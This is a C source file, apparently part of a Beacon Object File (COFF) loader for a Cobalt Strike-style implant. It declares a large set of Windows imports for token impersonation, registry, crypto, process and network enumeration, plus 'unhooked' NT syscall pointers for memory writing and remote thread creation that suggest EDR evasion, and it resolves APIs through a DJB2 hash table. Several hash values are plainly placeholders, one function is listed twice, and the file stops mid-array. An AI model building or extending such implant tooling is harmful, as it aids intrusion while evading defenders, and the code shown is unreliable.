#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "beacon.h"

// === Estructuras COFF mínimas ===
#pragma pack(push, 1)
#pragma comment(linker, "/INCLUDE:__imp_BeaconPrintf")
#pragma comment(linker, "/INCLUDE:__imp_BeaconOutput")
#pragma comment(linker, "/INCLUDE:__imp_BeaconDataParse")
#pragma comment(linker, "/INCLUDE:__imp_BeaconDataInt")
#pragma comment(linker, "/INCLUDE:__imp_BeaconDataShort")
#pragma comment(linker, "/INCLUDE:__imp_BeaconDataExtract")
#pragma comment(linker, "/INCLUDE:__imp_LoadLibraryA")
#pragma comment(linker, "/INCLUDE:__imp_LoadLibraryW")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleHandleA")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleHandleW")
#pragma comment(linker, "/INCLUDE:__imp_GetProcAddress")
#pragma comment(linker, "/INCLUDE:__imp_GetLastError")
#pragma comment(linker, "/INCLUDE:__imp_CloseHandle")
#pragma comment(linker, "/INCLUDE:__imp_ExitProcess")
#pragma comment(linker, "/INCLUDE:__imp_ExitThread")
#pragma comment(linker, "/INCLUDE:__imp_Sleep")
#pragma comment(linker, "/INCLUDE:__imp_CreateThread")
#pragma comment(linker, "/INCLUDE:__imp_GetCurrentProcess")
#pragma comment(linker, "/INCLUDE:__imp_GetCurrentProcessId")
#pragma comment(linker, "/INCLUDE:__imp_GetCurrentThreadId")
#pragma comment(linker, "/INCLUDE:__imp_GetTickCount")
#pragma comment(linker, "/INCLUDE:__imp_GetTickCount64")
#pragma comment(linker, "/INCLUDE:__imp_CreateFileA")
#pragma comment(linker, "/INCLUDE:__imp_CreateFileW")
#pragma comment(linker, "/INCLUDE:__imp_ReadFile")
#pragma comment(linker, "/INCLUDE:__imp_WriteFile")
#pragma comment(linker, "/INCLUDE:__imp_SetFilePointer")
#pragma comment(linker, "/INCLUDE:__imp_SetEndOfFile")
#pragma comment(linker, "/INCLUDE:__imp_DeleteFileA")
#pragma comment(linker, "/INCLUDE:__imp_DeleteFileW")
#pragma comment(linker, "/INCLUDE:__imp_MoveFileA")
#pragma comment(linker, "/INCLUDE:__imp_MoveFileW")
#pragma comment(linker, "/INCLUDE:__imp_CopyFileA")
#pragma comment(linker, "/INCLUDE:__imp_CopyFileW")
#pragma comment(linker, "/INCLUDE:__imp_GetFileSize")
#pragma comment(linker, "/INCLUDE:__imp_GetFileSizeEx")
#pragma comment(linker, "/INCLUDE:__imp_CreateDirectoryA")
#pragma comment(linker, "/INCLUDE:__imp_CreateDirectoryW")
#pragma comment(linker, "/INCLUDE:__imp_RemoveDirectoryA")
#pragma comment(linker, "/INCLUDE:__imp_RemoveDirectoryW")
#pragma comment(linker, "/INCLUDE:__imp_FindFirstFileA")
#pragma comment(linker, "/INCLUDE:__imp_FindFirstFileW")
#pragma comment(linker, "/INCLUDE:__imp_FindNextFileA")
#pragma comment(linker, "/INCLUDE:__imp_FindNextFileW")
#pragma comment(linker, "/INCLUDE:__imp_FindClose")
#pragma comment(linker, "/INCLUDE:__imp_GetFileAttributesA")
#pragma comment(linker, "/INCLUDE:__imp_GetFileAttributesW")
#pragma comment(linker, "/INCLUDE:__imp_SetFileAttributesA")
#pragma comment(linker, "/INCLUDE:__imp_SetFileAttributesW")
#pragma comment(linker, "/INCLUDE:__imp_GetSystemDirectoryA")
#pragma comment(linker, "/INCLUDE:__imp_GetSystemDirectoryW")
#pragma comment(linker, "/INCLUDE:__imp_GetWindowsDirectoryA")
#pragma comment(linker, "/INCLUDE:__imp_GetWindowsDirectoryW")
#pragma comment(linker, "/INCLUDE:__imp_GetTempPathA")
#pragma comment(linker, "/INCLUDE:__imp_GetTempPathW")
#pragma comment(linker, "/INCLUDE:__imp_GetComputerNameA")
#pragma comment(linker, "/INCLUDE:__imp_GetComputerNameW")
#pragma comment(linker, "/INCLUDE:__imp_GetUserNameA")
#pragma comment(linker, "/INCLUDE:__imp_GetUserNameW")
#pragma comment(linker, "/INCLUDE:__imp_GetVersionExA")
#pragma comment(linker, "/INCLUDE:__imp_GetVersionExW")
#pragma comment(linker, "/INCLUDE:__imp_GetNativeSystemInfo")
#pragma comment(linker, "/INCLUDE:__imp_VirtualAlloc")
#pragma comment(linker, "/INCLUDE:__imp_VirtualFree")
#pragma comment(linker, "/INCLUDE:__imp_VirtualProtect")
#pragma comment(linker, "/INCLUDE:__imp_VirtualQuery")
#pragma comment(linker, "/INCLUDE:__imp_HeapAlloc")
#pragma comment(linker, "/INCLUDE:__imp_HeapFree")
#pragma comment(linker, "/INCLUDE:__imp_LocalAlloc")
#pragma comment(linker, "/INCLUDE:__imp_LocalFree")
#pragma comment(linker, "/INCLUDE:__imp_GlobalAlloc")
#pragma comment(linker, "/INCLUDE:__imp_GlobalFree")
#pragma comment(linker, "/INCLUDE:__imp_RtlMoveMemory")
#pragma comment(linker, "/INCLUDE:__imp_RtlCopyMemory")
#pragma comment(linker, "/INCLUDE:__imp_RtlFillMemory")
#pragma comment(linker, "/INCLUDE:__imp_RtlZeroMemory")
#pragma comment(linker, "/INCLUDE:__imp_lstrlenA")
#pragma comment(linker, "/INCLUDE:__imp_lstrlenW")
#pragma comment(linker, "/INCLUDE:__imp_lstrcpyA")
#pragma comment(linker, "/INCLUDE:__imp_lstrcpyW")
#pragma comment(linker, "/INCLUDE:__imp_lstrcatA")
#pragma comment(linker, "/INCLUDE:__imp_lstrcatW")
#pragma comment(linker, "/INCLUDE:__imp_lstrcmpA")
#pragma comment(linker, "/INCLUDE:__imp_lstrcmpW")
#pragma comment(linker, "/INCLUDE:__imp_lstrcmpiA")
#pragma comment(linker, "/INCLUDE:__imp_lstrcmpiW")
#pragma comment(linker, "/INCLUDE:__imp_MultiByteToWideChar")
#pragma comment(linker, "/INCLUDE:__imp_WideCharToMultiByte")
#pragma comment(linker, "/INCLUDE:__imp_FormatMessageA")
#pragma comment(linker, "/INCLUDE:__imp_FormatMessageW")
#pragma comment(linker, "/INCLUDE:__imp_GetEnvironmentVariableA")
#pragma comment(linker, "/INCLUDE:__imp_GetEnvironmentVariableW")
#pragma comment(linker, "/INCLUDE:__imp_SetEnvironmentVariableA")
#pragma comment(linker, "/INCLUDE:__imp_SetEnvironmentVariableW")
#pragma comment(linker, "/INCLUDE:__imp_ExpandEnvironmentStringsA")
#pragma comment(linker, "/INCLUDE:__imp_ExpandEnvironmentStringsW")
#pragma comment(linker, "/INCLUDE:__imp_GetCommandLineA")
#pragma comment(linker, "/INCLUDE:__imp_GetCommandLineW")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleFileNameA")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleFileNameW")
#pragma comment(linker, "/INCLUDE:__imp_GetStartupInfoA")
#pragma comment(linker, "/INCLUDE:__imp_GetStartupInfoW")
#pragma comment(linker, "/INCLUDE:__imp_FreeLibrary")
#pragma comment(linker, "/INCLUDE:__imp_GetConsoleWindow")
#pragma comment(linker, "/INCLUDE:__imp_AllocConsole")
#pragma comment(linker, "/INCLUDE:__imp_FreeConsole")
#pragma comment(linker, "/INCLUDE:__imp_AttachConsole")
#pragma comment(linker, "/INCLUDE:__imp_IsDebuggerPresent")
#pragma comment(linker, "/INCLUDE:__imp_CheckRemoteDebuggerPresent")
#pragma comment(linker, "/INCLUDE:__imp_OutputDebugStringA")
#pragma comment(linker, "/INCLUDE:__imp_OutputDebugStringW")
#pragma comment(linker, "/INCLUDE:__imp_OpenProcess")
#pragma comment(linker, "/INCLUDE:__imp_OpenProcessToken")
#pragma comment(linker, "/INCLUDE:__imp_DuplicateTokenEx")
#pragma comment(linker, "/INCLUDE:__imp_ImpersonateLoggedOnUser")
#pragma comment(linker, "/INCLUDE:__imp_RevertToSelf")
#pragma comment(linker, "/INCLUDE:__imp_LookupPrivilegeValueA")
#pragma comment(linker, "/INCLUDE:__imp_LookupPrivilegeValueW")
#pragma comment(linker, "/INCLUDE:__imp_AdjustTokenPrivileges")
#pragma comment(linker, "/INCLUDE:__imp_CreateProcessAsUserA")
#pragma comment(linker, "/INCLUDE:__imp_CreateProcessAsUserW")
#pragma comment(linker, "/INCLUDE:__imp_RegOpenKeyExA")
#pragma comment(linker, "/INCLUDE:__imp_RegOpenKeyExW")
#pragma comment(linker, "/INCLUDE:__imp_RegCreateKeyExA")
#pragma comment(linker, "/INCLUDE:__imp_RegCreateKeyExW")
#pragma comment(linker, "/INCLUDE:__imp_RegSetValueExA")
#pragma comment(linker, "/INCLUDE:__imp_RegSetValueExW")
#pragma comment(linker, "/INCLUDE:__imp_RegQueryValueExA")
#pragma comment(linker, "/INCLUDE:__imp_RegQueryValueExW")
#pragma comment(linker, "/INCLUDE:__imp_RegDeleteValueA")
#pragma comment(linker, "/INCLUDE:__imp_RegDeleteValueW")
#pragma comment(linker, "/INCLUDE:__imp_RegCloseKey")
#pragma comment(linker, "/INCLUDE:__imp_RegEnumKeyExA")
#pragma comment(linker, "/INCLUDE:__imp_RegEnumKeyExW")
#pragma comment(linker, "/INCLUDE:__imp_RegEnumValueA")
#pragma comment(linker, "/INCLUDE:__imp_RegEnumValueW")
#pragma comment(linker, "/INCLUDE:__imp_CryptAcquireContextA")
#pragma comment(linker, "/INCLUDE:__imp_CryptAcquireContextW")
#pragma comment(linker, "/INCLUDE:__imp_CryptCreateHash")
#pragma comment(linker, "/INCLUDE:__imp_CryptHashData")
#pragma comment(linker, "/INCLUDE:__imp_CryptDeriveKey")
#pragma comment(linker, "/INCLUDE:__imp_CryptEncrypt")
#pragma comment(linker, "/INCLUDE:__imp_CryptDecrypt")
#pragma comment(linker, "/INCLUDE:__imp_CryptReleaseContext")
#pragma comment(linker, "/INCLUDE:__imp_CryptDestroyHash")
#pragma comment(linker, "/INCLUDE:__imp_CryptDestroyKey")
#pragma comment(linker, "/INCLUDE:__imp_CryptGenRandom")
#pragma comment(linker, "/INCLUDE:__imp_CoInitializeEx")
#pragma comment(linker, "/INCLUDE:__imp_CoUninitialize")
#pragma comment(linker, "/INCLUDE:__imp_CoCreateInstance")
#pragma comment(linker, "/INCLUDE:__imp_CoTaskMemFree")
#pragma comment(linker, "/INCLUDE:__imp_IIDFromString")
#pragma comment(linker, "/INCLUDE:__imp_StringFromGUID2")
#pragma comment(linker, "/INCLUDE:__imp_VariantInit")
#pragma comment(linker, "/INCLUDE:__imp_VariantClear")
#pragma comment(linker, "/INCLUDE:__imp_VariantChangeType")
#pragma comment(linker, "/INCLUDE:__imp_SysAllocString")
#pragma comment(linker, "/INCLUDE:__imp_SysFreeString")
#pragma comment(linker, "/INCLUDE:__imp_SysStringLen")
#pragma comment(linker, "/INCLUDE:__imp_SHGetFolderPathA")
#pragma comment(linker, "/INCLUDE:__imp_SHGetFolderPathW")
#pragma comment(linker, "/INCLUDE:__imp_SHGetKnownFolderPath")
#pragma comment(linker, "/INCLUDE:__imp_PathFileExistsA")
#pragma comment(linker, "/INCLUDE:__imp_PathFileExistsW")
#pragma comment(linker, "/INCLUDE:__imp_PathCombineA")
#pragma comment(linker, "/INCLUDE:__imp_PathCombineW")
#pragma comment(linker, "/INCLUDE:__imp_GetDesktopWindow")
#pragma comment(linker, "/INCLUDE:__imp_GetShellWindow")
#pragma comment(linker, "/INCLUDE:__imp_FindWindowA")
#pragma comment(linker, "/INCLUDE:__imp_FindWindowW")
#pragma comment(linker, "/INCLUDE:__imp_EnumWindows")
#pragma comment(linker, "/INCLUDE:__imp_GetWindowTextA")
#pragma comment(linker, "/INCLUDE:__imp_GetWindowTextW")
#pragma comment(linker, "/INCLUDE:__imp_GetClassNameA")
#pragma comment(linker, "/INCLUDE:__imp_GetClassNameW")
#pragma comment(linker, "/INCLUDE:__imp_SendMessageA")
#pragma comment(linker, "/INCLUDE:__imp_SendMessageW")
#pragma comment(linker, "/INCLUDE:__imp_EnumProcesses")
#pragma comment(linker, "/INCLUDE:__imp_EnumProcessModules")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleBaseNameA")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleBaseNameW")
#pragma comment(linker, "/INCLUDE:__imp_GetModuleInformation")
#pragma comment(linker, "/INCLUDE:__imp_WSASocketA")
#pragma comment(linker, "/INCLUDE:__imp_WSASocketW")
#pragma comment(linker, "/INCLUDE:__imp_WSAStartup")
#pragma comment(linker, "/INCLUDE:__imp_WSACleanup")
#pragma comment(linker, "/INCLUDE:__imp_bind")
#pragma comment(linker, "/INCLUDE:__imp_listen")
#pragma comment(linker, "/INCLUDE:__imp_accept")
#pragma comment(linker, "/INCLUDE:__imp_connect")
#pragma comment(linker, "/INCLUDE:__imp_send")
#pragma comment(linker, "/INCLUDE:__imp_recv")
#pragma comment(linker, "/INCLUDE:__imp_closesocket")
#pragma comment(linker, "/INCLUDE:__imp_ioctlsocket")
#pragma comment(linker, "/INCLUDE:__imp_gethostname")
#pragma comment(linker, "/INCLUDE:__imp_gethostbyname")
#pragma comment(linker, "/INCLUDE:__imp_getaddrinfo")
#pragma comment(linker, "/INCLUDE:__imp_freeaddrinfo")
#pragma comment(linker, "/INCLUDE:__imp_htons")
#pragma comment(linker, "/INCLUDE:__imp_ntohs")
#pragma comment(linker, "/INCLUDE:__imp_htonl")
#pragma comment(linker, "/INCLUDE:__imp_ntohl")
#pragma comment(linker, "/INCLUDE:__imp_NetUserEnum")
#pragma comment(linker, "/INCLUDE:__imp_NetLocalGroupEnum")
#pragma comment(linker, "/INCLUDE:__imp_NetShareEnum")
#pragma comment(linker, "/INCLUDE:__imp_NetWkstaUserEnum")
#pragma comment(linker, "/INCLUDE:__imp_NetSessionEnum")
#pragma comment(linker, "/INCLUDE:__imp_NetApiBufferFree")
#pragma comment(linker, "/INCLUDE:__imp_WNetOpenEnumA")
#pragma comment(linker, "/INCLUDE:__imp_WNetOpenEnumW")
#pragma comment(linker, "/INCLUDE:__imp_WNetEnumResourceA")
#pragma comment(linker, "/INCLUDE:__imp_WNetEnumResourceW")
#pragma comment(linker, "/INCLUDE:__imp_WNetCloseEnum")
#pragma comment(linker, "/INCLUDE:__imp__stricmp")
#pragma comment(linker, "/INCLUDE:__imp_Process32Next")
#pragma comment(linker, "/INCLUDE:__imp_IsWow64Process")
#pragma comment(linker, "/INCLUDE:__imp_Process32First")
#pragma comment(linker, "/INCLUDE:__imp_CreateToolhelp32Snapshot")
#pragma comment(linker, "/INCLUDE:g_pNtCreateFileUnhooked")
#pragma comment(linker, "/INCLUDE:g_pNtWriteVirtualMemoryUnhooked")
#pragma comment(linker, "/INCLUDE:g_pNtProtectVirtualMemoryUnhooked")
#pragma comment(linker, "/INCLUDE:g_pNtResumeThreadUnhooked")
#pragma comment(linker, "/INCLUDE:g_pNtCreateThreadExUnhooked")

extern PVOID __imp_BeaconPrintf;
extern PVOID __imp_BeaconOutput;
extern PVOID __imp_BeaconDataParse;
extern PVOID __imp_BeaconDataInt;
extern PVOID __imp_BeaconDataShort;
extern PVOID __imp_BeaconDataExtract;
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_LoadLibraryW;
extern PVOID __imp_GetModuleHandleA;
extern PVOID __imp_GetModuleHandleW;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_GetLastError;
extern PVOID __imp_CloseHandle;
extern PVOID __imp_ExitProcess;
extern PVOID __imp_ExitThread;
extern PVOID __imp_Sleep;
extern PVOID __imp_CreateThread;
extern PVOID __imp_GetCurrentProcess;
extern PVOID __imp_GetCurrentProcessId;
extern PVOID __imp_GetCurrentThreadId;
extern PVOID __imp_GetTickCount;
extern PVOID __imp_GetTickCount64;
extern PVOID __imp_CreateFileA;
extern PVOID __imp_CreateFileW;
extern PVOID __imp_ReadFile;
extern PVOID __imp_WriteFile;
extern PVOID __imp_SetFilePointer;
extern PVOID __imp_SetEndOfFile;
extern PVOID __imp_DeleteFileA;
extern PVOID __imp_DeleteFileW;
extern PVOID __imp_MoveFileA;
extern PVOID __imp_MoveFileW;
extern PVOID __imp_CopyFileA;
extern PVOID __imp_CopyFileW;
extern PVOID __imp_GetFileSize;
extern PVOID __imp_GetFileSizeEx;
extern PVOID __imp_CreateDirectoryA;
extern PVOID __imp_CreateDirectoryW;
extern PVOID __imp_RemoveDirectoryA;
extern PVOID __imp_RemoveDirectoryW;
extern PVOID __imp_FindFirstFileA;
extern PVOID __imp_FindFirstFileW;
extern PVOID __imp_FindNextFileA;
extern PVOID __imp_FindNextFileW;
extern PVOID __imp_FindClose;
extern PVOID __imp_GetFileAttributesA;
extern PVOID __imp_GetFileAttributesW;
extern PVOID __imp_SetFileAttributesA;
extern PVOID __imp_SetFileAttributesW;
extern PVOID __imp_GetSystemDirectoryA;
extern PVOID __imp_GetSystemDirectoryW;
extern PVOID __imp_GetWindowsDirectoryA;
extern PVOID __imp_GetWindowsDirectoryW;
extern PVOID __imp_GetTempPathA;
extern PVOID __imp_GetTempPathW;
extern PVOID __imp_GetComputerNameA;
extern PVOID __imp_GetComputerNameW;
extern PVOID __imp_GetUserNameA;
extern PVOID __imp_GetUserNameW;
extern PVOID __imp_GetVersionExA;
extern PVOID __imp_GetVersionExW;
extern PVOID __imp_GetNativeSystemInfo;
extern PVOID __imp_VirtualAlloc;
extern PVOID __imp_VirtualFree;
extern PVOID __imp_VirtualProtect;
extern PVOID __imp_VirtualQuery;
extern PVOID __imp_HeapAlloc;
extern PVOID __imp_HeapFree;
extern PVOID __imp_LocalAlloc;
extern PVOID __imp_LocalFree;
extern PVOID __imp_GlobalAlloc;
extern PVOID __imp_GlobalFree;
extern PVOID __imp_RtlMoveMemory;
extern PVOID __imp_RtlCopyMemory;
extern PVOID __imp_RtlFillMemory;
extern PVOID __imp_RtlZeroMemory;
extern PVOID __imp_lstrlenA;
extern PVOID __imp_lstrlenW;
extern PVOID __imp_lstrcpyA;
extern PVOID __imp_lstrcpyW;
extern PVOID __imp_lstrcatA;
extern PVOID __imp_lstrcatW;
extern PVOID __imp_lstrcmpA;
extern PVOID __imp_lstrcmpW;
extern PVOID __imp_lstrcmpiA;
extern PVOID __imp_lstrcmpiW;
extern PVOID __imp_MultiByteToWideChar;
extern PVOID __imp_WideCharToMultiByte;
extern PVOID __imp_FormatMessageA;
extern PVOID __imp_FormatMessageW;
extern PVOID __imp_GetEnvironmentVariableA;
extern PVOID __imp_GetEnvironmentVariableW;
extern PVOID __imp_SetEnvironmentVariableA;
extern PVOID __imp_SetEnvironmentVariableW;
extern PVOID __imp_ExpandEnvironmentStringsA;
extern PVOID __imp_ExpandEnvironmentStringsW;
extern PVOID __imp_GetCommandLineA;
extern PVOID __imp_GetCommandLineW;
extern PVOID __imp_GetModuleFileNameA;
extern PVOID __imp_GetModuleFileNameW;
extern PVOID __imp_GetStartupInfoA;
extern PVOID __imp_GetStartupInfoW;
extern PVOID __imp_FreeLibrary;
extern PVOID __imp_GetConsoleWindow;
extern PVOID __imp_AllocConsole;
extern PVOID __imp_FreeConsole;
extern PVOID __imp_AttachConsole;
extern PVOID __imp_IsDebuggerPresent;
extern PVOID __imp_CheckRemoteDebuggerPresent;
extern PVOID __imp_OutputDebugStringA;
extern PVOID __imp_OutputDebugStringW;
extern PVOID __imp_OpenProcess;
extern PVOID __imp_OpenProcessToken;
extern PVOID __imp_DuplicateTokenEx;
extern PVOID __imp_ImpersonateLoggedOnUser;
extern PVOID __imp_RevertToSelf;
extern PVOID __imp_LookupPrivilegeValueA;
extern PVOID __imp_LookupPrivilegeValueW;
extern PVOID __imp_AdjustTokenPrivileges;
extern PVOID __imp_CreateProcessAsUserA;
extern PVOID __imp_CreateProcessAsUserW;
extern PVOID __imp_RegOpenKeyExA;
extern PVOID __imp_RegOpenKeyExW;
extern PVOID __imp_RegCreateKeyExA;
extern PVOID __imp_RegCreateKeyExW;
extern PVOID __imp_RegSetValueExA;
extern PVOID __imp_RegSetValueExW;
extern PVOID __imp_RegQueryValueExA;
extern PVOID __imp_RegQueryValueExW;
extern PVOID __imp_RegDeleteValueA;
extern PVOID __imp_RegDeleteValueW;
extern PVOID __imp_RegCloseKey;
extern PVOID __imp_RegEnumKeyExA;
extern PVOID __imp_RegEnumKeyExW;
extern PVOID __imp_RegEnumValueA;
extern PVOID __imp_RegEnumValueW;
extern PVOID __imp_CryptAcquireContextA;
extern PVOID __imp_CryptAcquireContextW;
extern PVOID __imp_CryptCreateHash;
extern PVOID __imp_CryptHashData;
extern PVOID __imp_CryptDeriveKey;
extern PVOID __imp_CryptEncrypt;
extern PVOID __imp_CryptDecrypt;
extern PVOID __imp_CryptReleaseContext;
extern PVOID __imp_CryptDestroyHash;
extern PVOID __imp_CryptDestroyKey;
extern PVOID __imp_CryptGenRandom;
extern PVOID __imp_CoInitializeEx;
extern PVOID __imp_CoUninitialize;
extern PVOID __imp_CoCreateInstance;
extern PVOID __imp_CoTaskMemFree;
extern PVOID __imp_IIDFromString;
extern PVOID __imp_StringFromGUID2;
extern PVOID __imp_VariantInit;
extern PVOID __imp_VariantClear;
extern PVOID __imp_VariantChangeType;
extern PVOID __imp_SysAllocString;
extern PVOID __imp_SysFreeString;
extern PVOID __imp_SysStringLen;
extern PVOID __imp_SHGetFolderPathA;
extern PVOID __imp_SHGetFolderPathW;
extern PVOID __imp_SHGetKnownFolderPath;
extern PVOID __imp_PathFileExistsA;
extern PVOID __imp_PathFileExistsW;
extern PVOID __imp_PathCombineA;
extern PVOID __imp_PathCombineW;
extern PVOID __imp_GetDesktopWindow;
extern PVOID __imp_GetShellWindow;
extern PVOID __imp_FindWindowA;
extern PVOID __imp_FindWindowW;
extern PVOID __imp_EnumWindows;
extern PVOID __imp_GetWindowTextA;
extern PVOID __imp_GetWindowTextW;
extern PVOID __imp_GetClassNameA;
extern PVOID __imp_GetClassNameW;
extern PVOID __imp_SendMessageA;
extern PVOID __imp_SendMessageW;
extern PVOID __imp_EnumProcesses;
extern PVOID __imp_EnumProcessModules;
extern PVOID __imp_GetModuleBaseNameA;
extern PVOID __imp_GetModuleBaseNameW;
extern PVOID __imp_GetModuleInformation;
extern PVOID __imp_WSASocketA;
extern PVOID __imp_WSASocketW;
extern PVOID __imp_WSAStartup;
extern PVOID __imp_WSACleanup;
extern PVOID __imp_bind;
extern PVOID __imp_listen;
extern PVOID __imp_accept;
extern PVOID __imp_connect;
extern PVOID __imp_send;
extern PVOID __imp_recv;
extern PVOID __imp_closesocket;
extern PVOID __imp_ioctlsocket;
extern PVOID __imp_gethostname;
extern PVOID __imp_gethostbyname;
extern PVOID __imp_getaddrinfo;
extern PVOID __imp_freeaddrinfo;
extern PVOID __imp_htons;
extern PVOID __imp_ntohs;
extern PVOID __imp_htonl;
extern PVOID __imp_ntohl;
extern PVOID __imp_NetUserEnum;
extern PVOID __imp_NetLocalGroupEnum;
extern PVOID __imp_NetShareEnum;
extern PVOID __imp_NetWkstaUserEnum;
extern PVOID __imp_NetSessionEnum;
extern PVOID __imp_NetApiBufferFree;
extern PVOID __imp_WNetOpenEnumA;
extern PVOID __imp_WNetOpenEnumW;
extern PVOID __imp_WNetEnumResourceA;
extern PVOID __imp_WNetEnumResourceW;
extern PVOID __imp_WNetCloseEnum;
extern PVOID __imp__stricmp;
extern PVOID __imp_Process32Next;
extern PVOID __imp_IsWow64Process;
extern PVOID __imp_Process32First;
extern PVOID __imp_CreateToolhelp32Snapshot;

extern PVOID g_pNtCreateFileUnhooked;
extern PVOID g_pNtWriteVirtualMemoryUnhooked;
extern PVOID g_pNtProtectVirtualMemoryUnhooked;
extern PVOID g_pNtResumeThreadUnhooked;
extern PVOID g_pNtCreateThreadExUnhooked;
// Definiciones completas de relocaciones x64 (agrega esto arriba de todo, cerca de otros #include o #define)
#define IMAGE_REL_AMD64_ABSOLUTE    0x0000
#define IMAGE_REL_AMD64_ADDR64      0x0001
#define IMAGE_REL_AMD64_ADDR32      0x0002
#define IMAGE_REL_AMD64_ADDR32NB    0x0003
#define IMAGE_REL_AMD64_REL32       0x0004
#define IMAGE_REL_AMD64_REL32_1     0x0005
#define IMAGE_REL_AMD64_REL32_2     0x0006
#define IMAGE_REL_AMD64_REL32_3     0x0007
#define IMAGE_REL_AMD64_REL32_4     0x0008
#define IMAGE_REL_AMD64_REL32_5     0x0009
#define IMAGE_REL_AMD64_SECTION     0x000A
#define IMAGE_REL_AMD64_SECREL      0x000B
#define IMAGE_REL_AMD64_SECREL7     0x000C
#define IMAGE_REL_AMD64_TOKEN       0x000D
#define IMAGE_REL_AMD64_SREL32      0x000E
#define IMAGE_REL_AMD64_PAIR        0x000F
#define IMAGE_REL_AMD64_SSPAN32     0x0010

typedef struct {
    char Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} COFFSection;

typedef struct {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD Type;
} COFFRelocation;

typedef struct {
    union {
        char Name[8];
        struct {
            DWORD Zeroes;
            DWORD Offset;
        };
    };
    DWORD Value;
    SHORT SectionNumber;
    WORD Type;
    BYTE StorageClass;
    BYTE NumberOfAuxSymbols;
} COFFSymbol;

typedef struct {
    USHORT Machine;
    USHORT NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    USHORT SizeOfOptionalHeader;
    USHORT Characteristics;
} COFFHeader;
#pragma pack(pop)

// === Función hash DJB2 ===
static uint32_t djb2_hash(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}

// === Tabla de símbolos por hash ===
typedef struct {
    uint32_t hash;
    void* ptr;
} SymbolHash;

// === Tabla de símbolos por hash (djb2) - GENERADA AUTOMÁTICAMENTE ===
static SymbolHash g_symbol_table[] = {
    // === Funciones Beacon ===
    { 0xE2494BA2, (void*)BeaconDataParse },                  // "BeaconDataParse"
    { 0x1a2b3c4d, (void*)BeaconDataInt },                    // "BeaconDataInt"
    { 0x5e6f7a8b, (void*)BeaconDataShort },                  // "BeaconDataShort"
    { 0x80D46722, (void*)BeaconDataExtract },                // "BeaconDataExtract"
    { 0x700d8660, (void*)BeaconPrintf },                     // "BeaconPrintf"
    { 0x36b7a083, (void*)BeaconPrintf },
    { 0x6df4b81e, (void*)BeaconOutput },                     // "BeaconOutput"
    
    // === Funciones del sistema ===
    { 0x266A0B1E, (void*)&__imp_LoadLibraryA },
    { 0x266A0B34, (void*)&__imp_LoadLibraryW },
    { 0x3EB5B2FB, (void*)&__imp_GetModuleHandleA },
    { 0x3EB5B311, (void*)&__imp_GetModuleHandleW },
    { 0xE8CAEA02, (void*)&__imp_GetProcAddress },
    { 0xE72D0506, (void*)&__imp_GetLastError },
    { 0xE15EABCA, (void*)&__imp_CloseHandle },
    { 0x60571561, (void*)&__imp_ExitProcess },
    { 0x22D289BA, (void*)&__imp_ExitThread },
    { 0xD8FE7181, (void*)&__imp_Sleep },
    { 0x45B30E74, (void*)&__imp_CreateThread },
    { 0x433C5D2A, (void*)&__imp_GetCurrentProcess },
    { 0x03C85977, (void*)&__imp_GetCurrentProcessId },
    { 0x612A2AF0, (void*)&__imp_GetCurrentThreadId },
    { 0x085730DC, (void*)&__imp_GetTickCount },
    { 0x7AE6DF06, (void*)&__imp_GetTickCount64 },
    { 0x9484A7BD, (void*)&__imp_CreateFileA },
    { 0x9484A7D3, (void*)&__imp_CreateFileW },
    { 0x4DE619C4, (void*)&__imp_ReadFile },
    { 0xDFB181B3, (void*)&__imp_WriteFile },
    { 0x6D889AD5, (void*)&__imp_SetFilePointer },
    { 0x2BCA90A0, (void*)&__imp_SetEndOfFile },
    { 0xC5C668DC, (void*)&__imp_DeleteFileA },
    { 0xC5C668F2, (void*)&__imp_DeleteFileW },
    { 0x51A992C0, (void*)&__imp_MoveFileA },
    { 0x51A992D6, (void*)&__imp_MoveFileW },
    { 0x2596E8C4, (void*)&__imp_CopyFileA },
    { 0x2596E8DA, (void*)&__imp_CopyFileW },
    { 0x217FA6E3, (void*)&__imp_GetFileSize },
    { 0x8004F500, (void*)&__imp_GetFileSizeEx },
    { 0x269B3392, (void*)&__imp_CreateDirectoryA },
    { 0x269B33A8, (void*)&__imp_CreateDirectoryW },
    { 0x2632E5CC, (void*)&__imp_RemoveDirectoryA },
    { 0x2632E5E2, (void*)&__imp_RemoveDirectoryW },
    { 0xC7BF65B2, (void*)&__imp_FindFirstFileA },
    { 0xC7BF65C8, (void*)&__imp_FindFirstFileW },
    { 0x8FA19AC9, (void*)&__imp_FindNextFileA },
    { 0x8FA19ADF, (void*)&__imp_FindNextFileW },
    { 0x2E5BDA1F, (void*)&__imp_FindClose },
    { 0x5B285530, (void*)&__imp_GetFileAttributesA },
    { 0x5B285546, (void*)&__imp_GetFileAttributesW },
    { 0x8431EEBC, (void*)&__imp_SetFileAttributesA },
    { 0x8431EED2, (void*)&__imp_SetFileAttributesW },
    { 0x464CB923, (void*)&__imp_GetSystemDirectoryA },
    { 0x464CB939, (void*)&__imp_GetSystemDirectoryW },
    { 0xF6E3F6E9, (void*)&__imp_GetWindowsDirectoryA },
    { 0xF6E3F6FF, (void*)&__imp_GetWindowsDirectoryW },
    { 0x65A3940C, (void*)&__imp_GetTempPathA },
    { 0x65A39422, (void*)&__imp_GetTempPathW },
    { 0x8F043359, (void*)&__imp_GetComputerNameA },
    { 0x8F04336F, (void*)&__imp_GetComputerNameW },
    { 0x626DC569, (void*)&__imp_GetUserNameA },
    { 0x626DC57F, (void*)&__imp_GetUserNameW },
    { 0xE1AD8D6C, (void*)&__imp_GetVersionExA },
